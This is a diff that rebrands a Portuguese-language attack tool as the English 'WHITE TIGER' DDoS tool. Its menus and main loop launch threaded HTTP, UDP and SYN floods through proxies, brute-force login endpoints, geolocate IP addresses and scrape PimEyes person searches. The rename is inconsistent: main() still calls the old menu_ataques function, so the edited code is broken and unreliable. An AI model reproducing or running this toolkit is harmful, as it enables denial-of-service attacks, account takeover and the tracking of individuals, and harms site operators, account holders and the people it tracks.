@@ -24,8 +24,8 @@ def clear(): os.system('cls' if os.name=='nt' else 'clear')
 
 def banner():
     clear()
-    print(f"{C.R}🔥😈 DIABO NEGRO 😈🔥{C.E}")
-    print(f"{C.C}Ferramenta multi-função by SALATIEL & ZHADKYEL{C.E}")
+    print(f"{C.R}🔥 WHITE TIGER 🔥{C.E}")
+    print(f"{C.C}DDos tool multi function by WHITE TIGER {C.E}")
     print("="*55)
 
 def load_proxies():
@@ -33,7 +33,7 @@ def load_proxies():
         return [l.strip() for l in open(PROXY_FILE) if l.strip()]
     return []
 
-# === ATAQUES ===
+# === ATTACKS ===
 def http_flood(url, proxy=None):
     sess = requests.Session()
     headers = {"User-Agent": random.choice(USER_AGENTS)}
@@ -79,7 +79,7 @@ def combo_flood(url):
             ex.submit(udp_flood, ip, port_udp)
             ex.submit(syn_flood, ip, port_tcp)
 
-# === FORÇA BRUTA ===
+# === BRUTE FORCE ===
 def megamedusa_brute(url):
     print(f"{C.Y}MegaMedusa brute → {url}{C.E}")
     sess = requests.Session()
@@ -118,21 +118,21 @@ def basic_auth_brute(url):
                 print(f"[-] {u}:{p}")
             except: pass
 
-# === RASTREAMENTO IP ===
+# === TRACKING IP ===
 def trace_ip_api(ip):
-    print(f"{C.C}Rastreando IP → {ip}{C.E}")
+    print(f"{C.C}Tracking IP → {ip}{C.E}")
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
         if r.get("status")=="success":
             for k in ["country","regionName","city","isp","org","lat","lon"]:
                 print(f"{k.capitalize()}: {r.get(k)}")
         else:
-            print("Busca falhou.")
+            print("Search failed.")
     except Exception as e:
         print("Erro:", e)
 
 def trace_ip_multi(ip):
-    print(f"{C.C}Verificando IPinfo + ip-api{C.E}")
+    print(f"{C.C}Verification IPinfo + ip-api{C.E}")
     try:
         r=requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
         print("IPinfo:", r.get("org"), r.get("country"), r.get("timezone"))
@@ -141,13 +141,13 @@ def trace_ip_multi(ip):
 
 # === PIMEYES ===
 def pimeyes_search(query):
-    print(f"{C.Y}Buscando no PimEyes → '{query}'{C.E}")
+    print(f"{C.Y}Searching for PimEyes → '{query}'{C.E}")
     try:
         r = requests.get("https://pimeyes.com/pt/search", headers={"User-Agent":random.choice(USER_AGENTS)}, params={"search":query}, timeout=10)
         soup=BeautifulSoup(r.text,"html.parser")
         res=soup.select(".results__result")
         if not res:
-            print("Nenhum resultado.")
+            print("No result.")
             return
         for i,el in enumerate(res[:5]):
             link=el.find("a",href=True)["href"]
@@ -156,35 +156,35 @@ def pimeyes_search(query):
     except Exception as e:
         print("Erro:", e)
 
-# === MENUS ===
+# === MENU ===
 def menu():
     banner()
-    print(f"{C.Y}1{C.E} - Ataques")
-    print(f"{C.Y}2{C.E} - Força Bruta")
-    print(f"{C.Y}3{C.E} - Rastreamento IP")
+    print(f"{C.Y}1{C.E} - Attacks")
+    print(f"{C.Y}2{C.E} - Brute Force")
+    print(f"{C.Y}3{C.E} - Tracking IP")
     print(f"{C.Y}4{C.E} - PimEyes Search")
-    print(f"{C.Y}0{C.E} - Sair")
-    return input("Escolha: ").strip()
+    print(f"{C.Y}0{C.E} - Back")
+    return input("Choice: ").strip()
 
-def menu_ataques():
+def menu_attacks():
     clear(); print(f"{C.R}=== ATAQUES ==={C.E}")
-    print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Voltar")
+    print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Back")
     return input("Opção: ").strip()
 
 def menu_brute():
     clear(); print(f"{C.R}=== FORÇA BRUTA ==={C.E}")
     print("1 - MegaMedusa (HTTP POST)\n2 - Pandora (TCP)\n3 - HTTP Basic Auth\n0 - Voltar")
-    return input("Opção: ").strip()
+    return input("Option: ").strip()
 
 def menu_trace():
-    clear(); print(f"{C.R}=== RASTREAMENTO IP ==={C.E}")
-    print("1 - Trace IP\n0 - Voltar")
-    return input("Opção: ").strip()
+    clear(); print(f"{C.R}=== TRACKING IP ==={C.E}")
+    print("1 - Trace IP\n0 - Back")
+    return input("Option: ").strip()
 
 def menu_pimeyes():
     clear(); print(f"{C.R}=== PIMEYES ==={C.E}")
-    print("1 - Buscar\n0 - Voltar")
-    return input("Opção: ").strip()
+    print("1 - Search\n0 - Back")
+    return input("Option: ").strip()
 
 # === LOOP PRINCIPAL ===
 def main():
@@ -193,22 +193,22 @@ def main():
         if op=="1":
             ao = menu_ataques()
             if ao=="1":
-                url=input("URL alvo: ")
+                url=input("URL target: ")
                 t=int(input("Threads: "))
                 ps=load_proxies()
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t):
                         ex.submit(http_flood, url, random.choice(ps) if ps else None)
             elif ao=="2":
-                ip=input("IP alvo: "); port=int(input("Porta UDP: ")); t=int(input("Threads: "))
+                ip=input("IP target: "); port=int(input("Porta UDP: ")); t=int(input("Threads: "))
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t): ex.submit(udp_flood, ip, port)
             elif ao=="3":
-                ip=input("IP alvo: "); port=int(input("Porta TCP: ")); t=int(input("Threads: "))
+                ip=input("IP target: "); port=int(input("Porta TCP: ")); t=int(input("Threads: "))
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t): ex.submit(syn_flood, ip, port)
             elif ao=="4":
-                combo_flood(input("URL alvo (http://...): "))
+                combo_flood(input("URL target (http://...): "))
         elif op=="2":
             bo = menu_brute()
             if bo=="1": megamedusa_brute(input("URL login endpoint: "))
@@ -221,10 +221,10 @@ def main():
             pm = menu_pimeyes()
             if pm=="1": pimeyes_search(input("Termo ou URL: "))
         elif op=="0":
-            print(f"{C.G}Encerrando o DIABO NEGRO...{C.E}")
+            print(f"{C.G}Close the WHIYE TIGER...{C.E}")
             sys.exit()
         else:
-            print(f"{C.R}Opção inválida.{C.E}")
+            print(f"{C.R}Option invalid.{C.E}")
         time.sleep(1)
 
 if __name__=="__main__": main()
